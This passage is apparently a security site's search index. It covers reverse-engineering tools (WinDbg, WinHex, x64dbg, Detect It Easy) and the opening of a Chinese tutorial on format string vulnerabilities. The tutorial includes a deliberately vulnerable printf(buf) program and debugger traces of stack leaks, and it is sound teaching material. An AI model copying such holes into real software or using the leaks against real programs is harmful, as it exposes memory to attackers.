underlying engine as WinDbg today, so all the commands, extensions, and workflows still work as they did before. Download WinDbg Preview from the Microsoft Store: WinDbg Preview . Learn more about installation and configuration in WinDbg Preview - Installation . Debugging Tools for Windows 10 (WinDbg) Get Debugging Tools for Windows (WinDbg) from the SDK: Windows 10 SDK . Use the download link on the Windows 10 SDK page, as the Debugging Tools for Windows are not available as part of Visual Studio. If you just need the Debugging Tools for Windows, and not the Windows Driver Kit (WDK) for Windows 10, you can install the debugging tools as a standalone component from the Windows Software Development Kit (SDK). In the SDK installation wizard, select Debugging Tools for Windows , and deselect all other components. Adding the Debugging Tools for Windows if the SDK is already installed If the Windows SDK is already installed, open Settings , navigate to Apps & features , select Windows Software Development Kit , and then select Modify to change the installation to add Debugging Tools for Windows . Looking for the debugging tools for earlier versions of Windows? To download the debugger tools for previous versions of Windows, you need to download the Windows SDK for the version you are debugging from the Windows SDK and emulator archive . In the installation wizard of the SDK, select Debugging Tools for Windows , and deselect all other components. Learn more about the debuggers Learn more about WinDbg and other debuggers in Debugging Tools for Windows (WinDbg, KD, CDB, NTSD) .","title":"WinDbg"},{"location":"Tool/PWN/WinDbg/#windbg","text":"The Windows Debugger (WinDbg) can be used to debug kernel-mode and user-mode code, analyze crash dumps, and examine the CPU registers while the code executes. To get started with Windows debugging, see Getting Started with Windows Debugging .","title":"WinDbg"},{"location":"Tool/PWN/WinDbg/#download-windbg-preview","text":"WinDbg Preview is a new version of WinDbg with more modern visuals, faster windows, and a full-fledged scripting experience. It is built with the extensible object-orientated debugger data model front and center. WinDbg Preview is using the same underlying engine as WinDbg today, so all the commands, extensions, and workflows still work as they did before. Download WinDbg Preview from the Microsoft Store: WinDbg Preview . Learn more about installation and configuration in WinDbg Preview - Installation .","title":"Download WinDbg Preview"},{"location":"Tool/PWN/WinDbg/#debugging-tools-for-windows-10-windbg","text":"Get Debugging Tools for Windows (WinDbg) from the SDK: Windows 10 SDK . Use the download link on the Windows 10 SDK page, as the Debugging Tools for Windows are not available as part of Visual Studio. If you just need the Debugging Tools for Windows, and not the Windows Driver Kit (WDK) for Windows 10, you can install the debugging tools as a standalone component from the Windows Software Development Kit (SDK). In the SDK installation wizard, select Debugging Tools for Windows , and deselect all other components.","title":"Debugging Tools for Windows 10 (WinDbg)"},{"location":"Tool/PWN/WinDbg/#adding-the-debugging-tools-for-windows-if-the-sdk-is-already-installed","text":"If the Windows SDK is already installed, open Settings , navigate to Apps & features , select Windows Software Development Kit , and then select Modify to change the installation to add Debugging Tools for Windows .","title":"Adding the Debugging Tools for Windows if the SDK is already installed"},{"location":"Tool/PWN/WinDbg/#looking-for-the-debugging-tools-for-earlier-versions-of-windows","text":"To download the debugger tools for previous versions of Windows, you need to download the Windows SDK for the version you are debugging from the Windows SDK and emulator archive . In the installation wizard of the SDK, select Debugging Tools for Windows , and deselect all other components.","title":"Looking for the debugging tools for earlier versions of Windows?"},{"location":"Tool/PWN/WinDbg/#learn-more-about-the-debuggers","text":"Learn more about WinDbg and other debuggers in Debugging Tools for Windows (WinDbg, KD, CDB, NTSD) .","title":"Learn more about the debuggers"},{"location":"Tool/PWN/WinHex/","text":"WinHex: Computer Forensics & Data Recovery Software, Hex Editor & Disk Editor WinHex is in its core a universal hexadecimal editor, particularly helpful in the realm of computer forensics , data recovery , low-level data processing, and IT security. An advanced tool for everyday and emergency use: inspect and edit all kinds of files, recover deleted files or lost data from hard drives with corrupt file systems or from digital camera cards. Features depend on the license type ( license type comparison ), among them: Disk editor for hard disks, floppy disks, CD-ROM & DVD, ZIP, Smart Media, Compact Flash, ... Native support for FAT12/16/32, exFAT, NTFS, Ext2/3/4, Next3 \u00ae, CDFS, UDF Built-in interpretation of RAID systems and dynamic disks Various data recovery techniques RAM editor , providing access to physical RAM and other processes' virtual memory Data interpreter , knowing 20 data types Editing data structures using templates (e.g. to repair partition table/boot sector) Concatenating and splitting files, unifying and dividing odd and even bytes/words Analyzing and comparing files Particularly flexible search and replace functions Disk cloning (under DOS with X-Ways Replica ) Drive images & backups (optionally compressed or split into 650 MB archives) Programming interface (API) and scripting 256-bit AES encryption, checksums, CRC32, hashes (MD5, SHA-1, ...) Erase (wipe) confidential files securely, hard drive cleansing to protect your privacy Import all clipboard formats, incl. ASCII hex values Convert between binary, hex ASCII, Intel Hex, and Motorola S Character sets: ANSI ASCII, IBM ASCII, EBCDIC, (Unicode) Instant window switching. Printing. Random-number generator. Supports files of any size. Very fast. Easy to use. Extensive program help. More Having all the bits and bytes in a computer at your fingertips has become a reality. Try before you buy. Computer forensics edition of WinHex with even more features: X-Ways Forensics .","title":"WinHex: Computer Forensics & Data Recovery Software, Hex Editor & Disk Editor"},{"location":"Tool/PWN/WinHex/#winhex-computer-forensics-data-recovery-software-hex-editor-disk-editor","text":"WinHex is in its core a universal hexadecimal editor, particularly helpful in the realm of computer forensics , data recovery , low-level data processing, and IT security. An advanced tool for everyday and emergency use: inspect and edit all kinds of files, recover deleted files or lost data from hard drives with corrupt file systems or from digital camera cards. Features depend on the license type ( license type comparison ), among them: Disk editor for hard disks, floppy disks, CD-ROM & DVD, ZIP, Smart Media, Compact Flash, ... Native support for FAT12/16/32, exFAT, NTFS, Ext2/3/4, Next3 \u00ae, CDFS, UDF Built-in interpretation of RAID systems and dynamic disks Various data recovery techniques RAM editor , providing access to physical RAM and other processes' virtual memory Data interpreter , knowing 20 data types Editing data structures using templates (e.g. to repair partition table/boot sector) Concatenating and splitting files, unifying and dividing odd and even bytes/words Analyzing and comparing files Particularly flexible search and replace functions Disk cloning (under DOS with X-Ways Replica ) Drive images & backups (optionally compressed or split into 650 MB archives) Programming interface (API) and scripting 256-bit AES encryption, checksums, CRC32, hashes (MD5, SHA-1, ...) Erase (wipe) confidential files securely, hard drive cleansing to protect your privacy Import all clipboard formats, incl. ASCII hex values Convert between binary, hex ASCII, Intel Hex, and Motorola S Character sets: ANSI ASCII, IBM ASCII, EBCDIC, (Unicode) Instant window switching. Printing. Random-number generator. Supports files of any size. Very fast. Easy to use. Extensive program help. More Having all the bits and bytes in a computer at your fingertips has become a reality. Try before you buy. Computer forensics edition of WinHex with even more features: X-Ways Forensics .","title":"WinHex: Computer Forensics &amp; Data Recovery Software, Hex Editor &amp; Disk Editor"},{"location":"Tool/PWN/x64dbg/","text":"x64dbg An open-source x64/x32 debugger for windows. Check out the blog ! Features Open-source Intuitive and familiar, yet new user interface C-like expression parser Full-featured debugging of DLL and EXE files (TitanEngine) IDA-like sidebar with jump arrows IDA-like instruction token highlighter (highlight registers, etc.) Memory map Symbol view Thread view Source code view Content-sensitive register view Fully customizable color scheme Dynamically recognize modules and strings Import reconstructor integrated (Scylla) Fast disassembler ( Zydis ) User database (JSON) for comments, labels, bookmarks, etc. Plugin support with growing API Extendable, debuggable scripting language for automation Multi-datatype memory dump Basic debug symbol (PDB) support Dynamic stack view Built-in assembler (XEDParse/ asmjit ) Executable patching Yara Pattern Matching Decompiler ( Snowman ) Analysis Wiki https://github.com/x64dbg/x64dbg/wiki","title":"x64dbg"},{"location":"Tool/PWN/x64dbg/#x64dbg","text":"An open-source x64/x32 debugger for windows. Check out the blog !","title":"x64dbg"},{"location":"Tool/PWN/x64dbg/#features","text":"Open-source Intuitive and familiar, yet new user interface C-like expression parser Full-featured debugging of DLL and EXE files (TitanEngine) IDA-like sidebar with jump arrows IDA-like instruction token highlighter (highlight registers, etc.) Memory map Symbol view Thread view Source code view Content-sensitive register view Fully customizable color scheme Dynamically recognize modules and strings Import reconstructor integrated (Scylla) Fast disassembler ( Zydis ) User database (JSON) for comments, labels, bookmarks, etc. Plugin support with growing API Extendable, debuggable scripting language for automation Multi-datatype memory dump Basic debug symbol (PDB) support Dynamic stack view Built-in assembler (XEDParse/ asmjit ) Executable patching Yara Pattern Matching Decompiler ( Snowman ) Analysis","title":"Features"},{"location":"Tool/PWN/x64dbg/#wiki","text":"https://github.com/x64dbg/x64dbg/wiki","title":"Wiki"},{"location":"Tool/Reverse%20Engineering/Bytecode%20Viewer/","text":"Bytecode Viewer Bytecode Viewer - a lightweight user-friendly Java/Android Bytecode Viewer, Decompiler & More. New Features Dark mode with multiple themes Translated into over 30 languages including: Arabic, German, Japanese, Mandarin, Russian, Spanish Plugin Writer - create and edit external plugins from within BCV Fixed Java & Bytecode editing/compiling Tabbed plugin console Right-click menus on the resource and search panels Javap disassembler XAPK support Updated nearly all dependencies (incl. decompilers like CFR, JD-GUI etc.) Updated ASM library to version 9.1 Added support to Java files compiled using JDK > 13 Migrated to Maven Screenshot Homepage https://bytecodeviewer.com/ https://github.com/Konloch/bytecode-viewer","title":"Bytecode Viewer"},{"location":"Tool/Reverse%20Engineering/Bytecode%20Viewer/#bytecode-viewer","text":"Bytecode Viewer - a lightweight user-friendly Java/Android Bytecode Viewer, Decompiler & More.","title":"Bytecode Viewer"},{"location":"Tool/Reverse%20Engineering/Bytecode%20Viewer/#new-features","text":"Dark mode with multiple themes Translated into over 30 languages including: Arabic, German, Japanese, Mandarin, Russian, Spanish Plugin Writer - create and edit external plugins from within BCV Fixed Java & Bytecode editing/compiling Tabbed plugin console Right-click menus on the resource and search panels Javap disassembler XAPK support Updated nearly all dependencies (incl. decompilers like CFR, JD-GUI etc.) Updated ASM library to version 9.1 Added support to Java files compiled using JDK > 13 Migrated to Maven","title":"New Features"},{"location":"Tool/Reverse%20Engineering/Bytecode%20Viewer/#screenshot","text":"","title":"Screenshot"},{"location":"Tool/Reverse%20Engineering/Bytecode%20Viewer/#homepage","text":"https://bytecodeviewer.com/ https://github.com/Konloch/bytecode-viewer","title":"Homepage"},{"location":"Tool/Reverse%20Engineering/DiE/","text":"Detect it Easy (DiE) Detect It Easy, or abbreviated \"DIE\" is a program for determining types of files. \"DIE\" is a cross-platform application, apart from Windows version there are also available versions for Linux and Mac OS. Many programs of the kind (PEID, PE tools) allow to use third-party signatures. Unfortunately, those signatures scan only bytes by the pre-set mask, and it is not possible to specify additional parameters. As the result, false triggering often occur. More complicated algorithms are usually strictly set in the program itself. Hence, to add a new complex detect one needs to recompile the entire project. No one, except the authors themselves, can change the algorithm of a detect. As time passes, such programs lose relevance without the constant support. Detect It Easy has totally open architecture of signatures. You can easily add your own algorithms of detects or modify those that already exist. This is achieved by using scripts. The script language is very similar to JavaScript and any person, who understands the basics of programming, will understand easily how it works. Possibly, someone may decide the scripts are working very slow. Indeed, scripts run slower than compiled code, but, thanks to the good optimization of Script Engine, this doesn't cause any special inconvenience. The possibilities of open architecture compensate these limitations. DIE exists in three versions. Basic version (\"DIE\"), Lite version (\"DIEL\") and console version (\"DIEC\"). All the three use the same signatures, which are located in the folder \"db\". If you open this folder, nested sub-folders will be found (\"Binary\", \"PE\" and others). The names of sub-folders correspond to the types of files. First, DIE determines the type of file, and then sequentially loads all the signatures, which lie in the corresponding folder. Currently the program defines the following types: MSDOS executable files MS-DOS PE executable files Windows ELF executable files Linux MACH executable files Mac OS Binary all other files Download: https://github.com/horsicq/DIE-engine/releases Changelog: https://github.com/horsicq/Detect-It-Easy/blob/master/changelog.txt Screenshot Homepage https://github.com/horsicq/Detect-It-Easy","title":"Detect it Easy (DiE)"},{"location":"Tool/Reverse%20Engineering/DiE/#detect-it-easy-die","text":"Detect It Easy, or abbreviated \"DIE\" is a program for determining types of files. \"DIE\" is a cross-platform application, apart from Windows version there are also available versions for Linux and Mac OS. Many programs of the kind (PEID, PE tools) allow to use third-party signatures. Unfortunately, those signatures scan only bytes by the pre-set mask, and it is not possible to specify additional parameters. As the result, false triggering often occur. More complicated algorithms are usually strictly set in the program itself. Hence, to add a new complex detect one needs to recompile the entire project. No one, except the authors themselves, can change the algorithm of a detect. As time passes, such programs lose relevance without the constant support. Detect It Easy has totally open architecture of signatures. You can easily add your own algorithms of detects or modify those that already exist. This is achieved by using scripts. The script language is very similar to JavaScript and any person, who understands the basics of programming, will understand easily how it works. Possibly, someone may decide the scripts are working very slow. Indeed, scripts run slower than compiled code, but, thanks to the good optimization of Script Engine, this doesn't cause any special inconvenience. The possibilities of open architecture compensate these limitations. DIE exists in three versions. Basic version (\"DIE\"), Lite version (\"DIEL\") and console version (\"DIEC\"). All the three use the same signatures, which are located in the folder \"db\". If you open this folder, nested sub-folders will be found (\"Binary\", \"PE\" and others). The names of sub-folders correspond to the types of files. First, DIE determines the type of file, and then sequentially loads all the signatures, which lie in the corresponding folder. Currently the program defines the following types: MSDOS executable files MS-DOS PE executable files Windows ELF executable files Linux MACH executable files Mac OS Binary all other files Download: https://github.com/horsicq/DIE-engine/releases Changelog: https://github.com/horsicq/Detect-It-Easy/blob/master/changelog.txt","title":"Detect it Easy (DiE)"},{"location":"Tool/Reverse%20Engineering/DiE/#screenshot","text":"","title":"Screenshot"},{"location":"Tool/Reverse%20Engineering/DiE/#homepage","text":"https://github.com/horsicq/Detect-It-Easy","title":"Homepage"},{"location":"Tool/Reverse%20Engineering/ExeInfoPE/","text":"ExeInfoPE Packer, compressor detector / unpack info / internal exe tools Detect : Symbian / Android / Linux / Mac OS - files PUP / PUA Applications & Downloaders Archives : .zip , .rar , .zlb , .gz , .7 zip , .tar , .cab .is , ... Screenshot Homepage http://exeinfo.booomhost.com/","title":"ExeInfoPE"},{"location":"Tool/Reverse%20Engineering/ExeInfoPE/#exeinfope","text":"Packer, compressor detector / unpack info / internal exe tools Detect : Symbian / Android / Linux / Mac OS - files PUP / PUA Applications & Downloaders Archives : .zip , .rar , .zlb , .gz , .7 zip , .tar , .cab .is , ...","title":"ExeInfoPE"},{"location":"Tool/Reverse%20Engineering/ExeInfoPE/#screenshot","text":"","title":"Screenshot"},{"location":"Tool/Reverse%20Engineering/ExeInfoPE/#homepage","text":"http://exeinfo.booomhost.com/","title":"Homepage"},{"location":"Tutorial/Material/Binary%20Exploitation/","text":"Binary Exploitation 3.1.1 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e \u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\u548c\u683c\u5f0f\u5b57\u7b26\u4e32 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u57fa\u672c\u539f\u7406 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528 x86-64 \u4e2d\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e CTF \u4e2d\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e \u6269\u5c55\u9605\u8bfb \u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\u548c\u683c\u5f0f\u5b57\u7b26\u4e32 \u5728 C \u8bed\u8a00\u57fa\u7840\u7ae0\u8282\u4e2d\uff0c\u6211\u4eec\u8be6\u7ec6\u4ecb\u7ecd\u4e86\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\u3002\u5728\u5f00\u59cb\u63a2\u7d22\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e4b\u524d\uff0c\u5f3a\u70c8\u5efa\u8bae\u56de\u987e\u8be5\u7ae0\u8282\u3002\u8fd9\u91cc\u6211\u4eec\u7b80\u5355\u56de\u987e\u51e0\u4e2a\u5e38\u7528\u7684\u3002 \u51fd\u6570 #include <stdio.h> int printf(const char *format, ...); int fprintf(FILE *stream, const char *format, ...); int dprintf(int fd, const char *format, ...); int sprintf(char *str, const char *format, ...); int snprintf(char *str, size_t size, const char *format, ...); \u8f6c\u6362\u6307\u793a\u7b26 \u5b57\u7b26 \u7c7b\u578b \u4f7f\u7528 d 4-byte Integer u 4-byte Unsigned Integer x 4-byte Hex s 4-byte ptr String c 1-byte Character \u957f\u5ea6 \u5b57\u7b26 \u7c7b\u578b \u4f7f\u7528 hh 1-byte char h 2-byte short int l 4-byte long int ll 8-byte long long int \u793a\u4f8b #include<stdio.h> #include<stdlib.h> void main() { char *format = \"%s\"; char *arg1 = \"Hello World!\\n\"; printf(format, arg1); } printf(\"%03d.%03d.%03d.%03d\", 127, 0, 0, 1); // \"127.000.000.001\" printf(\"%.2f\", 1.2345); // 1.23 printf(\"%#010x\", 3735928559); // 0xdeadbeef printf(\"%s%n\", \"01234\", &n); // n = 5 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u57fa\u672c\u539f\u7406 \u5728 x86 \u7ed3\u6784\u4e0b\uff0c\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u53c2\u6570\u662f\u901a\u8fc7\u6808\u4f20\u9012\u7684\uff0c\u770b\u4e00\u4e2a\u4f8b\u5b50\uff1a #include<stdio.h> void main() { printf(\"%s %d %s\", \"Hello World!\", 233, \"\\n\"); } gdb-peda$ disassemble main Dump of assembler code for function main: 0x0000053d <+0>: lea ecx,[esp+0x4] 0x00000541 <+4>: and esp,0xfffffff0 0x00000544 <+7>: push DWORD PTR [ecx-0x4] 0x00000547 <+10>: push ebp 0x00000548 <+11>: mov ebp,esp 0x0000054a <+13>: push ebx 0x0000054b <+14>: push ecx 0x0000054c <+15>: call 0x585 <__x86.get_pc_thunk.ax> 0x00000551 <+20>: add eax,0x1aaf 0x00000556 <+25>: lea edx,[eax-0x19f0] 0x0000055c <+31>: push edx 0x0000055d <+32>: push 0xe9 0x00000562 <+37>: lea edx,[eax-0x19ee] 0x00000568 <+43>: push edx 0x00000569 <+44>: lea edx,[eax-0x19e1] 0x0000056f <+50>: push edx 0x00000570 <+51>: mov ebx,eax 0x00000572 <+53>: call 0x3d0 <printf@plt> 0x00000577 <+58>: add esp,0x10 0x0000057a <+61>: nop 0x0000057b <+62>: lea esp,[ebp-0x8] 0x0000057e <+65>: pop ecx 0x0000057f <+66>: pop ebx 0x00000580 <+67>: pop ebp 0x00000581 <+68>: lea esp,[ecx-0x4] 0x00000584 <+71>: ret End of assembler dump. gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0x56557000 --> 0x1efc EBX: 0x56557000 --> 0x1efc ECX: 0xffffd250 --> 0x1 EDX: 0x5655561f (\"%s %d %s\") ESI: 0xf7f95000 --> 0x1bbd90 EDI: 0x0 EBP: 0xffffd238 --> 0x0 ESP: 0xffffd220 --> 0x5655561f (\"%s %d %s\") EIP: 0x56555572 (<main+53>: call 0x565553d0 <printf@plt>) EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x56555569 <main+44>: lea edx,[eax-0x19e1] 0x5655556f <main+50>: push edx 0x56555570 <main+51>: mov ebx,eax => 0x56555572 <main+53>: call 0x565553d0 <printf@plt> 0x56555577 <main+58>: add esp,0x10 0x5655557a <main+61>: nop 0x5655557b <main+62>: lea esp,[ebp-0x8] 0x5655557e <main+65>: pop ecx Guessed arguments: arg[0]: 0x5655561f (\"%s %d %s\") arg[1]: 0x56555612 (\"Hello World!\") arg[2]: 0xe9 arg[3]: 0x56555610 --> 0x6548000a ('\\n') [------------------------------------stack-------------------------------------] 0000| 0xffffd220 --> 0x5655561f (\"%s %d %s\") 0004| 0xffffd224 --> 0x56555612 (\"Hello World!\") 0008| 0xffffd228 --> 0xe9 0012| 0xffffd22c --> 0x56555610 --> 0x6548000a ('\\n') 0016| 0xffffd230 --> 0xffffd250 --> 0x1 0020| 0xffffd234 --> 0x0 0024| 0xffffd238 --> 0x0 0028| 0xffffd23c --> 0xf7df1253 (<__libc_start_main+243>: add esp,0x10) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x56555572 in main () gdb-peda$ r Continuing Hello World! 233 [Inferior 1 (process 27416) exited with code 022] \u6839\u636e cdecl \u7684\u8c03\u7528\u7ea6\u5b9a\uff0c\u5728\u8fdb\u5165 printf() \u51fd\u6570\u4e4b\u524d\uff0c\u5c06\u53c2\u6570\u4ece\u53f3\u5230\u5de6\u4f9d\u6b21\u538b\u6808\u3002\u8fdb\u5165 printf() \u4e4b\u540e\uff0c\u51fd\u6570\u9996\u5148\u83b7\u53d6\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u4e00\u6b21\u8bfb\u53d6\u4e00\u4e2a\u5b57\u7b26\u3002\u5982\u679c\u5b57\u7b26\u4e0d\u662f % \uff0c\u5b57\u7b26\u76f4\u63a5\u590d\u5236\u5230\u8f93\u51fa\u4e2d\u3002\u5426\u5219\uff0c\u8bfb\u53d6\u4e0b\u4e00\u4e2a\u975e\u7a7a\u5b57\u7b26\uff0c\u83b7\u53d6\u76f8\u5e94\u7684\u53c2\u6570\u5e76\u89e3\u6790\u8f93\u51fa\u3002\uff08\u6ce8\u610f\uff1a % d \u548c %d \u662f\u4e00\u6837\u7684\uff09 \u63a5\u4e0b\u6765\u6211\u4eec\u4fee\u6539\u4e00\u4e0b\u4e0a\u9762\u7684\u7a0b\u5e8f\uff0c\u7ed9\u683c\u5f0f\u5b57\u7b26\u4e32\u52a0\u4e0a %x %x %x %3$s \uff0c\u4f7f\u5b83\u51fa\u73b0\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff1a #include<stdio.h> void main() { printf(\"%s %d %s %x %x %x %3$s\", \"Hello World!\", 233, \"\\n\"); } \u53cd\u6c47\u7f16\u540e\u7684\u4ee3\u7801\u540c\u4e0a\uff0c\u6ca1\u6709\u4efb\u4f55\u533a\u522b\u3002\u6211\u4eec\u4e3b\u8981\u770b\u4e00\u4e0b\u53c2\u6570\u4f20\u9012\uff1a gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0x56557000 --> 0x1efc EBX: 0x56557000 --> 0x1efc ECX: 0xffffd250 --> 0x1 EDX: 0x5655561f (\"%s %d %s %x %x %x %3$s\") ESI: 0xf7f95000 --> 0x1bbd90 EDI: 0x0 EBP: 0xffffd238 --> 0x0 ESP: 0xffffd220 --> 0x5655561f (\"%s %d %s %x %x %x %3$s\") EIP: 0x56555572 (<main+53>: call 0x565553d0 <printf@plt>) EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x56555569 <main+44>: lea edx,[eax-0x19e1] 0x5655556f <main+50>: push edx 0x56555570 <main+51>: mov ebx,eax => 0x56555572 <main+53>: call 0x565553d0 <printf@plt> 0x56555577 <main+58>: add esp,0x10 0x5655557a <main+61>: nop 0x5655557b <main+62>: lea esp,[ebp-0x8] 0x5655557e <main+65>: pop ecx Guessed arguments: arg[0]: 0x5655561f (\"%s %d %s %x %x %x %3$s\") arg[1]: 0x56555612 (\"Hello World!\") arg[2]: 0xe9 arg[3]: 0x56555610 --> 0x6548000a ('\\n') [------------------------------------stack-------------------------------------] 0000| 0xffffd220 --> 0x5655561f (\"%s %d %s %x %x %x %3$s\") 0004| 0xffffd224 --> 0x56555612 (\"Hello World!\") 0008| 0xffffd228 --> 0xe9 0012| 0xffffd22c --> 0x56555610 --> 0x6548000a ('\\n') 0016| 0xffffd230 --> 0xffffd250 --> 0x1 0020| 0xffffd234 --> 0x0 0024| 0xffffd238 --> 0x0 0028| 0xffffd23c --> 0xf7df1253 (<__libc_start_main+243>: add esp,0x10) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x56555572 in main () gdb-peda$ c Continuing. Hello World! 233 ffffd250 0 0 [Inferior 1 (process 27480) exited with code 041] \u8fd9\u4e00\u6b21\u6808\u7684\u7ed3\u6784\u548c\u4e0a\u4e00\u6b21\u76f8\u540c\uff0c\u53ea\u662f\u683c\u5f0f\u5b57\u7b26\u4e32\u6709\u53d8\u5316\u3002\u7a0b\u5e8f\u6253\u5370\u51fa\u4e86\u4e03\u4e2a\u503c\uff08\u5305\u62ec\u6362\u884c\uff09\uff0c\u800c\u6211\u4eec\u5176\u5b9e\u53ea\u7ed9\u51fa\u4e86\u524d\u4e09\u4e2a\u503c\u7684\u5185\u5bb9\uff0c\u540e\u9762\u7684\u4e09\u4e2a %x \u6253\u5370\u51fa\u4e86 0xffffd230~0xffffd238 \u6808\u5185\u7684\u6570\u636e\uff0c\u8fd9\u4e9b\u90fd\u4e0d\u662f\u6211\u4eec\u8f93\u5165\u7684\u3002\u800c\u6700\u540e\u4e00\u4e2a\u53c2\u6570 %3$s \u662f\u5bf9 0xffffd22c \u4e2d \\n \u7684\u91cd\u7528\u3002 \u4e0a\u4e00\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u683c\u5f0f\u5b57\u7b26\u4e32\u4e2d\u8981\u6c42\u7684\u53c2\u6570\u4e2a\u6570\u5927\u4e8e\u6211\u4eec\u63d0\u4f9b\u7684\u53c2\u6570\u4e2a\u6570\u3002\u5728\u4e0b\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u7701\u53bb\u4e86\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c\u540c\u6837\u5b58\u5728\u6f0f\u6d1e\uff1a #include<stdio.h> void main() { char buf[50]; if (fgets(buf, sizeof buf, stdin) == NULL) return; printf(buf); } gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffffd1fa (\"Hello %x %x %x !\\n\") EBX: 0x56557000 --> 0x1ef8 ECX: 0xffffd1fa (\"Hello %x %x %x !\\n\") EDX: 0xf7f9685c --> 0x0 ESI: 0xf7f95000 --> 0x1bbd90 EDI: 0x0 EBP: 0xffffd238 --> 0x0 ESP: 0xffffd1e0 --> 0xffffd1fa (\"Hello %x %x %x !\\n\") EIP: 0x5655562a (<main+77>: call 0x56555450 <printf@plt>) EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x56555623 <main+70>: sub esp,0xc 0x56555626 <main+73>: lea eax,[ebp-0x3e] 0x56555629 <main+76>: push eax => 0x5655562a <main+77>: call 0x56555450 <printf@plt> 0x5655562f <main+82>: add esp,0x10 0x56555632 <main+85>: jmp 0x56555635 <main+88> 0x56555634 <main+87>: nop 0x56555635 <main+88>: mov eax,DWORD PTR [ebp-0xc] Guessed arguments: arg[0]: 0xffffd1fa (\"Hello %x %x %x !\\n\") [------------------------------------stack-------------------------------------] 0000| 0xffffd1e0 --> 0xffffd1fa (\"Hello %x %x %x !\\n\") 0004| 0xffffd1e4 --> 0x32 ('2') 0008| 0xffffd1e8 --> 0xf7f95580 --> 0xfbad2288 0012| 0xffffd1ec --> 0x565555f4 (<main+23>: add ebx,0x1a0c) 0016| 0xffffd1f0 --> 0xffffffff 0020| 0xffffd1f4 --> 0xffffd47a (\"/home/firmy/Desktop/RE4B/c.out\") 0024| 0xffffd1f8 --> 0x65485ea0 0028| 0xffffd1fc (\"llo %x %x %x !\\n\") [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x5655562a in main () gdb-peda$ c Continuing. Hello 32 f7f95580 565555f4 ! [Inferior 1 (process 28253) exited normally] \u5982\u679c\u5927\u5bb6\u90fd\u662f\u597d\u5b69\u5b50\uff0c\u8f93\u5165\u6b63\u5e38\u7684\u5b57\u7b26\uff0c\u7a0b\u5e8f\u5c31\u4e0d\u4f1a\u6709\u95ee\u9898\u3002\u7531\u4e8e\u6ca1\u6709\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u6211\u4eec\u5728 buf \u4e2d\u8f93\u5165\u4e00\u4e9b\u8f6c\u6362\u6307\u793a\u7b26\uff0c\u5219 printf() \u4f1a\u628a\u5b83\u5f53\u505a\u683c\u5f0f\u5b57\u7b26\u4e32\u5e76\u89e3\u6790\uff0c\u6f0f\u6d1e\u53d1\u751f\u3002\u4f8b\u5982\u4e0a\u9762\u6f14\u793a\u7684\u6211\u4eec\u8f93\u5165\u4e86 Hello %x %x %x !\\n \uff08\u5176\u4e2d \\n \u662f fgets() \u51fd\u6570\u7ed9\u6211\u4eec\u81ea\u52a8\u52a0\u4e0a\u7684\uff09\uff0c\u8fd9\u65f6\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u8f93\u51fa\u6808\u5185\u7684\u6570\u636e\u3002 \u6211\u4eec\u53ef\u4ee5\u603b\u7ed3\u51fa\uff0c\u5176\u5b9e\u683c\u5f0f\u5b57\u7b26\u4e32\u6f0f\u6d1e\u53d1\u751f\u7684\u6761\u4ef6\u5c31\u662f\u683c\u5f0f\u5b57\u7b26\u4e32\u8981\u6c42\u7684\u53c2\u6570\u548c\u5b9e\u9645\u63d0\u4f9b\u7684\u53c2\u6570\u4e0d\u5339\u914d\u3002\u4e0b\u9762\u6211\u4eec\u8ba8\u8bba\u4e24\u4e2a\u95ee\u9898\uff1a \u4e3a\u4ec0\u4e48\u53ef\u4ee5\u901a\u8fc7\u7f16\u8bd1\uff1f \u56e0\u4e3a printf() \u51fd\u6570\u7684\u53c2\u6570\u88ab\u5b9a\u4e49\u4e3a\u53ef\u53d8\u7684\u3002 \u4e3a\u4e86\u53d1\u73b0\u4e0d\u5339\u914d\u7684\u60c5\u51b5\uff0c\u7f16\u8bd1\u5668\u9700\u8981\u7406\u89e3 printf() \u662f\u600e\u4e48\u5de5\u4f5c\u7684\u548c\u683c\u5f0f\u5b57\u7b26\u4e32\u662f\u4ec0\u4e48\u3002\u7136\u800c\uff0c\u7f16\u8bd1\u5668\u5e76\u4e0d\u77e5\u9053\u8fd9\u4e9b\u3002 \u6709\u65f6\u683c\u5f0f\u5b57\u7b26\u4e32\u5e76\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u5b83\u53ef\u80fd\u5728\u7a0b\u5e8f\u6267\u884c\u4e2d\u52a8\u6001\u751f\u6210\u3002 printf() \u51fd\u6570\u81ea\u5df1\u53ef\u4ee5\u53d1\u73b0\u4e0d\u5339\u914d\u5417\uff1f printf() 